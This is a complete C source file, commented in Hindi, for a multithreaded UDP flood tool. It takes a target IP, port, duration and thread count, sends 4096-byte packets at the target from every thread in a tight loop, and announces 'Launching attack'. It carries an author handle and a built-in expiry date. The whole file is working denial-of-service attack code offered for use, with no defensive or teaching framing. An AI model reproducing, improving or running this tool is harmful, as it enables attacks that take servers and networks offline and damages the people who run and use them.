#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

#define PACKET_SIZE 4096  // UDP पैकेट का साइज
#define EXPIRY_YEAR 2026
#define EXPIRY_MONTH 3
#define EXPIRY_DAY 10

volatile int attack_running = 1;  // अटैक स्टेटस ट्रैक करने के लिए

// **CTRL+C हैंडलिंग ताकि प्रोग्राम सही से बंद हो**
void stop_attack(int sig) {
    attack_running = 0;
}

// **एक्सपायरी डेट चेक करने का फंक्शन**
int check_expiry() {
    time_t now = time(NULL);
    struct tm *current_time = localtime(&now);

    if (current_time->tm_year + 1900 > EXPIRY_YEAR ||
        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||
        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 == EXPIRY_MONTH && current_time->tm_mday >= EXPIRY_DAY)) {
        printf("\n[ERROR] This program has expired on 10 March 2026.\n");
        return 1;
    }
    return 0;
}

// **UDP पैकेट भेजने का फंक्शन**
void *udp_flood(void *arg) {
    char **params = (char **)arg;
    char *target_ip = params[0];
    int target_port = atoi(params[1]);
    int duration = atoi(params[2]);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

    char packet[PACKET_SIZE];
    memset(packet, 0xAA, PACKET_SIZE);  // पैकेट डेटा सेट करें

    time_t start_time = time(NULL);

    while (attack_running && (time(NULL) - start_time) < duration) {
        if (sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("Failed to send packet");
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    printf("\n[+] Made by @seedhe_maut\n");
    printf("[+] Expiry Date: 10 March 2026\n");

    if (check_expiry()) {
        return 1;
    }

    if (argc != 5) {
        printf("\nUsage: %s <IP> <Port> <Duration> <Threads>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    // **सिग्नल हैंडलिंग (CTRL+C)**
    signal(SIGINT, stop_attack);

    printf("\nLaunching attack on %s:%d for %d seconds with %d threads...\n", target_ip, target_port, duration, num_threads);

    pthread_t threads[num_threads];
    char *params[] = {target_ip, argv[2], argv[3]};

    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, udp_flood, params);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\nAttack completed.\n");

    return 0;
}
